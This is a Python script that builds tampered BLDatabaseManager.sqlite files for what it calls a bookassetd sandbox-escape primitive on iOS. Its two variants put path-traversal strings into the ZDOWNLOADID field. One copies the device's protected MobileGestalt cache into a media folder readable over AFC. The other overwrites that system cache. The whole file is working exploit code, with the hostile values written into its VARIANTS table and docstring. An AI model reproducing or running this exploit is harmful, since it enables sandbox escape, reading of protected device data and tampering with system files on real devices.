"""Build a custom BLDatabaseManager.sqlite whose install copies the DEVICE's own
MobileGestalt cache into AFC-readable /var/mobile/Media (read primitive via the same
bookassetd sandbox-escape primitive used for the write).

Variant rows:
  A) exfil : ZPLISTPATH = device gestalt cache, ZDOWNLOADID = ../../../../../../private/var/mobile/Media/MG-EXFIL.plist
  B) write : ZPLISTPATH = /var/mobile/Media/com.apple.MobileGestalt.plist, ZDOWNLOADID = ../../../../../../private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches/com.apple.MobileGestalt.plist
"""
import sqlite3, hashlib, plistlib, shutil, os, sys, json

SRC = 'up_BLDatabaseManager.sqlite'
GESTALT_CACHE = '/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches/com.apple.MobileGestalt.plist'

VARIANTS = {
    'exfil': {
        'ZPLISTPATH': GESTALT_CACHE,
        'ZDOWNLOADID': '../../../../../../private/var/mobile/Media/MG-EXFIL.plist',
        'ZASSETPATH': '/private/var/mobile/Media/MG-EXFIL.assetpath',
        'ZCOLLECTIONTITLE': 'MG exfil',
        'ZTITLE': 'MG exfil',
    },
    'write': {
        'ZPLISTPATH': '/var/mobile/Media/com.apple.MobileGestalt.plist',
        'ZDOWNLOADID': '../../../../../../private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches/com.apple.MobileGestalt.plist',
        'ZASSETPATH': '/private/var/mobile/Media/MG-WRITE.assetpath',
        'ZCOLLECTIONTITLE': 'MG write',
        'ZTITLE': 'MG write',
    },
}

def build(name, cfg):
    out = f'BLDB-{name}.sqlite'
    for ext in ('-wal', '-shm'):
        if os.path.exists(out + ext):
            os.remove(out + ext)
    shutil.copyfile(SRC, out)
    con = sqlite3.connect(out)
    cur = con.cursor()
    for k, v in cfg.items():
        cur.execute(f'UPDATE ZBLDOWNLOADINFO SET {k} = ? WHERE Z_PK = 1', (v,))
    con.commit()
    # fold WAL into the main file and switch off WAL so the served -wal can be empty
    print(name, 'checkpoint:', cur.execute('PRAGMA wal_checkpoint(TRUNCATE)').fetchall())
    print(name, 'journal_mode ->', cur.execute('PRAGMA journal_mode=DELETE').fetchall())
    con.close()
    for ext in ('-wal', '-shm'):
        p = out + ext
        if os.path.exists(p):
            os.remove(p)
    # validate the row reads back from the main file alone
    con = sqlite3.connect('file:' + out + '?mode=ro', uri=True)
    row = con.execute('SELECT ZPLISTPATH,ZDOWNLOADID,ZASSETPATH,ZTITLE,ZURL,ZSTATE FROM ZBLDOWNLOADINFO').fetchone()
    con.close()
    print(name, 'row:', row)
    print(name, 'sha1:', hashlib.sha1(open(out, 'rb').read()).hexdigest(), 'size:', os.path.getsize(out))
    return out

if __name__ == '__main__':
    which = sys.argv[1] if len(sys.argv) > 1 else 'all'
    for name, cfg in VARIANTS.items():
        if which in ('all', name):
            build(name, cfg)
